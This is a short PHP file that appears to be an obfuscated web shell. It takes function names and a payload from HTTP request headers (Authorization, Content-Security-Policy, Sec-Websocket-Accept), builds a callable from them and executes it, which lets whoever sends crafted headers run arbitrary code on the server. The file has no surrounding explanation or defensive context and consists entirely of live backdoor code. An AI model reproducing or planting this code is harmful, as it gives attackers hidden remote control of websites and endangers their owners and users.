<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $content = $_HEADERS['Authorization']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Sec-Websocket-Accept']));
    $content();
}